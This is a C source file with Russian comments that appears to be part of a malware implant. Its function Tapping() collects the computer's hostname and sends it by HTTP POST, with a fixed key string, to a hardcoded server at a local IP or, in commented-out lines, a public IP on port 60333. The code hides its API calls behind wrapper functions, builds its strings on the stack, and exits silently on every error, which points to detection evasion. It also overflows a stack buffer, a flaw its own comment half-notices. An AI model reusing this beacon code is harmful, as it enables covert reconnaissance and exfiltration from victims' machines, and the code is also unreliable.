/*
InternetOpen        - открываем глобальный доступ к WinINet
InternetConnectA	- подключаемся к ip по заданному порту
HttpOpenRequestA	- готовим http post-запрос
HttpSendRequestA	- отправляем запрос с заголовками и телом
InternetReadFile	- читаем ответ сервера
InternetCloseHandle	- освобождаем ресурсы
*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

/*
#pragma comment(lib, "wininet.lib")
*/

#include "proxy_funck.c"


int Post_Request(const char* ip, INTERNET_PORT port, const char *path, char *data,  const char *headers)
{
    DWORD dataLen = strlen(data);                       // Вычисляем длину тела запроса
    char buffer[4096];                                  // Длина тела запроса
    DWORD bytesRead;                                    // Кол-во реально прочитанных байтов

    char userAgent_utka[] = "WinInet_Post";

    HINTERNET hInternet = ProxyInternetOpenA(           // Инициализация WinInet сесии
        // "WinInet_Post",                                 // Имя User-Agent-а (можно любое)
        userAgent_utka,
        INTERNET_OPEN_TYPE_DIRECT,                      // Подключение напрямую, без прокси
        NULL, NULL, 0);

    if (!hInternet) {
        // printf("InternetOpen failed: %lu\n", GetLastError());
        exit(1);
    }

    HINTERNET hConnect = ProxyInternetConnectA(              // Подключение к серверу по ip и порту
        hInternet,
        ip,
        port,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,                          // Используем http
        0, 0
    );

    if (!hConnect) {
        // printf("InternetConnext failed: %lu\n", GetLastError());
        exit(1);
    }

    char post_utka[] = "POST";

    HINTERNET hRequest = ProxyHttpOpenRequestA(         // Открытие http запроса типа post
        hConnect,
        //"POST",                                         // Метод запроса
        post_utka,
        path,
        NULL,                                           // Версия http (NULL - по умолчанию)
        NULL,                                           // Рефер (не используем)
        NULL,                                           // Принятые типы (по умолчанию)
        INTERNET_FLAG_RELOAD,                           // Всегда загружать с сервера, не использовать кеш
        0
    );

    if (!ProxyHttpSendRequestA(                         // Отправка post запроса
        hRequest, 
        headers, 
        -1,                                             // Указываем, что мы сами добавили нультерминатор
        (LPVOID)data,                                   // Указатель на post данные
        dataLen)                                        // Длина тела запроса
    ) {          
        // printf("HttpSend failded: %lu\n", GetLastError);
        exit(1);
    }
    else {

        if(ProxyInternetReadFile(                            // Читаем ответ от сервера
            hRequest,
            buffer,                                     // Указатель на буфер, куда будет считан ответ
            sizeof(buffer) - 1,                         // Кол-во байт, которые мы готовы принять (1 байт под нультерминатор)
            &bytesRead)                                 // Сколько байт прочитали
            && bytesRead > 0
        ) {
            buffer[bytesRead] = '\0';                                               // Завершаем строку нультерминатором
            // printf("Response:\n%s\n", buffer);                                      // Выводим полученный ответ
        }
        else {
            // printf("InternetReadFile failed: %lu\n", GetLastError());
            exit(1);
        }
    };

    ProxyInternetCloseHandle(hRequest);
    ProxyInternetCloseHandle(hConnect);
    ProxyInternetCloseHandle(hInternet);
    
    return 0;
}


int Tapping()
{
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];             // Максимальный размер имени компьютера + 1 для '\0'
    DWORD size = sizeof(hostname);                          // Размер буфера для Hostname
    if (ProxyGetComputerNameA(hostname, &size)) {
        // printf("Hostname: %s\n", hostname);
    } else {
        // printf("Error GetComputerName: %lu\n", GetLastError());
        exit(1);
    }

    // const char    *ip_utka = "185.70.105.52";
    // INTERNET_PORT port = 60333;
    // const char    *path_utka = "/sdferwerdsfasdf";
    // const char    *headers_utka = "Content-Type: application/x-www-form-urlencoded";
    // char data[MAX_COMPUTERNAME_LENGTH] = "15823405720242=";     // По каким то причинам, если не посавить добавление Hostname вначале, он пападает в переменные ip и тд
    // strncat(data, hostname, MAX_COMPUTERNAME_LENGTH - 1);  

    char data[MAX_COMPUTERNAME_LENGTH] = "15823405720242=";     // Ключ для того чтобы запрос был обработан + разделитель
    strncat(data, hostname, MAX_COMPUTERNAME_LENGTH - 1);       // Добавляем к data Hostname

    char ip_utka[] = "192.168.1.2"; 
    const char *temp_ip = ip_utka;

    INTERNET_PORT port = 8080;

    const char path_utka[] = "/sdferwerdsfasdf";
    const char *temp_path = path_utka;

    const char headers_utka[] = "Content-Type: application/x-www-form-urlencoded";
    const char *temp_headers = headers_utka;

    Post_Request(temp_ip, port, temp_path, data, temp_headers);

    return 0;
}